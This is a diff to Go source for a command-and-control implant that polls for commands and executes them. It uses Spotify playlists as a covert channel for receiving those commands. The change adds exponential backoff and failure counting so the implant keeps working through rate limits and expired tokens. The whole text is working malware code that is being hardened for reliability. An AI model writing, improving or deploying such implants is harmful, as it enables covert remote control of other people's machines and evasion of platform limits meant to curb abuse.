@@ -18,12 +18,13 @@ import (
 
 // Implant polls for commands and executes them.
 type Implant struct {
-	client         *spotify.Client
-	key            string
-	interval       int
-	jitter         int
-	processedSeqs  map[int]bool
-	checkinPending bool
+	client          *spotify.Client
+	key             string
+	interval        int
+	jitter          int
+	processedSeqs   map[int]bool
+	checkinPending  bool
+	consecutiveFails int
 }
 
 // NewImplant creates a new implant.
@@ -186,7 +187,19 @@ func (imp *Implant) Run() {
 
 	for {
 		imp.pollAndExecute()
+
+		// Calculate sleep: normal jitter + exponential backoff on failures
 		sleepTime := imp.interval + rand.Intn(2*imp.jitter+1) - imp.jitter
+		if imp.consecutiveFails > 0 {
+			// Exponential backoff: 30s, 60s, 120s, 240s, max 300s
+			backoff := 30 * (1 << (imp.consecutiveFails - 1))
+			if backoff > 300 {
+				backoff = 300
+			}
+			sleepTime = backoff
+			fmt.Printf("[*] Backoff: next poll in %s (fail #%d)\n",
+				formatDuration(sleepTime), imp.consecutiveFails)
+		}
 		if sleepTime < 10 {
 			sleepTime = 10
 		}
@@ -197,31 +210,39 @@ func (imp *Implant) Run() {
 func (imp *Implant) pollAndExecute() {
 	ctx := context.Background()
 
-	// Retry checkin if it failed earlier
-	if imp.checkinPending {
+	// Retry checkin if it failed earlier, but not if we're rate limited
+	if imp.checkinPending && imp.consecutiveFails == 0 {
 		imp.sendCheckin()
 	}
 
 	seqGroups, err := imp.client.ReadC2Playlists(ctx,
 		protocol.ChannelCmd, imp.key, -1)
 	if err != nil {
+		imp.consecutiveFails++
 		if isTokenExpired(err) {
 			fmt.Printf("[!] Token expired at %s: delete .cache-* and re-authenticate\n",
 				time.Now().Format("15:04:05"))
 		} else if isRateLimit(err) {
 			retryAfter := parseRetryAfter(err)
 			if retryAfter > 0 {
-				fmt.Printf("[!] Rate limited at %s, backing off %s\n",
+				fmt.Printf("[!] Rate limited at %s, server says wait %s\n",
 					time.Now().Format("15:04:05"), formatDuration(retryAfter))
 				time.Sleep(time.Duration(retryAfter) * time.Second)
+				imp.consecutiveFails = 0 // reset after honoring the wait
+			} else {
+				// No Retry-After parsed — only log first occurrence
+				if imp.consecutiveFails <= 1 {
+					fmt.Printf("[!] Rate limited at %s, backing off\n",
+						time.Now().Format("15:04:05"))
+				}
 			}
-			// If retryAfter==0, just silently skip this cycle
 		} else {
 			fmt.Printf("[!] Poll error at %s: %v\n",
 				time.Now().Format("15:04:05"), err)
 		}
 		return
 	}
+	imp.consecutiveFails = 0 // reset on success
 
 	if len(seqGroups) == 0 {
 		return
